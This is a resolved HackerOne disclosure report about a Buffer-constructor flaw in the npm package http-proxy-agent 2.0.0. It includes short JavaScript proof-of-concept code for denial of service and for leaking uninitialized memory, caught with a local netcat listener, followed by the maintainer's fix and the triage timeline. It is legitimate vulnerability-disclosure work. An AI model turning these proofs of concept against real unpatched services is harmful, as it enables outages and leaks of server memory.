---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/uncontrolled-resource-consumption
  - env/web
  - stack/node
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2018-04-05
submitted: 2018-03-03T19:07:43.490Z
bounty_usd: null
votes: 7
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "chalker"
source: "https://hackerone.com/reports/321631"
title: "`http-proxy-agent` passes unsanitized options to Buffer(arg), resulting in DoS and uninitialized memory leak"
---
# `http-proxy-agent` passes unsanitized options to Buffer(arg), resulting in DoS and uninitialized memory leak

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 7 | **Program:** Node.js third-party modules | **Disclosed:** 2018-04-05

- Report: [https://hackerone.com/reports/321631](https://hackerone.com/reports/321631)
- CWE: Uncontrolled Resource Consumption
- Submitted: 2018-03-03T19:07:43.490Z

## Report summary

Unguarded `Buffer(arg)` in `auth` option, which can leak data or cause DoS if typed user input (e.g. from JSON) ends up there.
Resolved in `http-proxy-agent@2.1.0` by switching to `Buffer.from(arg)` (new Buffer API).

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a Buffer allocation vulnerability in `http-proxy-agent`.

In setups where auth argument is user-controlled, it allows to:

cause Denial of Service by trivially consuming all the available CPU resources
extract uninitialized memory chunks from the server on Node.js <8.x.
# Module

**module name:** `http-proxy-agent`
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/http-proxy-agent`

## Module Description

> This module provides an http.Agent implementation that connects to a specified HTTP or HTTPS proxy server, and can be used with the built-in http module.

## Module Stats

112 721 downloads in the last day
707 979 downloads in the last week
2 953 077 downloads in the last month

# Vulnerability

## Vulnerability Description

`http-proxy-agent` passes `auth` option to the Buffer constructor without proper sanitization, resulting in DoS and uninitialized memory leak in setups where an attacker could submit typed input to the 'auth' parameter (e.g. JSON).

The exact line: https://github.com/TooTallNate/node-http-proxy-agent/blob/master/index.js#L80

## Steps To Reproduce:

### DoS

```js
var url = require('url');
var http = require('http');
var HttpProxyAgent = require('http-proxy-agent');

var proxy = {
  protocol: 'http:',
  host: "127.0.0.1",
  port: 8080
};

setInterval(() => {
  proxy.auth = 1e9; // a number as 'auth'
  var opts = url.parse('http://example.com/');
  var agent = new HttpProxyAgent(proxy);
  opts.agent = agent;
  console.time('tick');
  http.get(opts);
  console.timeEnd('tick');
}, 200);
```

Observe how this is consuming memory and CPU — each request takes >1 second in the main thread on my setup.

### Uninitialized memory leak

```js
// listen with: nc -l -p 8080

var url = require('url');
var http = require('http');
var HttpProxyAgent = require('http-proxy-agent');

var proxy = {
  protocol: 'http:',
  host: "127.0.0.1",
  port: 8080
};

proxy.auth = 500; // a number as 'auth'
var opts = url.parse('http://example.com/');
var agent = new HttpProxyAgent(proxy);
opts.agent = agent;
http.get(opts);
```

Listen with `nl -l -p 8080` to see requests.

Execute on various Node.js versions — 4.x LTS, 6.x LTS, 8.x LTS / 9.x.

This leaks uninitialized Buffer memory on Node.js <8.x.
On ≥8.x those Buffers (that are using the deprecated API) are zero-filled.

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- OS: Arch Linux current
- Node.js 9.5.0
- npm 5.6.0
- gnu-netcat 0.7.1

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

# Note

Almost entirely similar to `https-proxy-agent`, but this is a separate package, a separate GitHub repo, different version numbers, different lines in code, different download stats.

## Impact

Denial of service
Sensitive data leak (on Node.js <8.0)

## Timeline

- **Report Filed**
- **2018-03-03** @chalker: @lirantal the author is the same as in `https-proxy-agent`.
- **2018-03-03** @lirantal: Thanks. Inviting Nathan to this report too.
- **2018-03-03** @lirantal: Hi @chalker,

Thanks for reporting this issue.

I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
- **Report Triaged**
- **2018-03-03** @lirantal: I requested a CVE to be assigned for this report.
- **External User Joined**
- **2018-03-03** @nrajlich: I had a feeling it would be the same case for more of these modules. Thanks for looking into it.
- **2018-03-03** @nrajlich: LGTY?

```diff
diff --git a/index.js b/index.js
index 4bc9704..f90a529 100644
--- a/index.js
+++ b/index.js
@@ -75,9 +75,11 @@ HttpProxyAgent.prototype.callback = function connect (req, opts, fn) {
   req.path = absolute;

   // inject the `Proxy-Authorization` header if necessary
-  var auth = proxy.auth;
-  if (auth) {
-    req.setHeader('Proxy-Authorization', 'Basic ' + new Buffer(auth).toString('base64'));
+  if (proxy.auth) {
+    req.setHeader(
+      'Proxy-Authorization',
+      'Basic ' + Buffer.from(proxy.auth).toString('base64')
+    );
   }

   // create a socket connection to the proxy server
```
- **2018-03-03** @chalker: Yes, LGTM. Style changes are unrelated, but the actual switch from `new Buffer` to `Buffer.from` fixes the issue here.

Works on Node.js versions newer or equal to 4.5.0 without a polyfill. If you (for some reason) need support for older versions — install a polyfill or let me know, I will provide a feature-detection patch with type guards. I recommend to just use `Buffer.from` as in the patch above, though, given that 4.x will be out of support in about two months, download numbers for 4.x and the fact that probably only a small part of those downloads is for versions below 4.5.
- **2018-03-03** @chalker: Thanks for confirming the patch!
- **2018-03-03** @nrajlich: Indeed, let's not worry about backwards compatability in this case (same as `https-proxy-agent`).
- **2018-03-03** @nrajlich: `http-proxy-agent@2.1.0` published.
- **2018-03-05** @chalker: @lirantal seems resolved to me. Disclosure — similar as with #319532.
- **2018-03-05** @chalker: @nrajlich Updating `proxy-agent` deps would be also useful, btw, atm that modules requires old versions of `http-proxy-agent@^1.0.0` and `https-proxy-agent@^1.0.0`. See https://github.com/TooTallNate/node-proxy-agent/issues/17
- **2018-03-05** @lirantal: I'm waiting for a CVE to be assigned.

@nrajlich I will release a full public disclosure within 2 weeks time as we did with the other report unless you tell me differently.
- **Report Resolved**
- **Report Severity Updated**
- **Report Severity Updated**
- **2018-03-05** @chalker: @lirantal Severity of #321631 and #319532 should be equal, I guess. Not sure equal to *what*, but equal =).

I don't see the current CVSS vector, could you share it?
- **2018-03-05** @lirantal: Yep.

No easy way to get it from the system but it's scored at 8.2 with NKNNULNH
- **Changed Scope**
- **Agreed On Going Public**
- **Report Became Public**
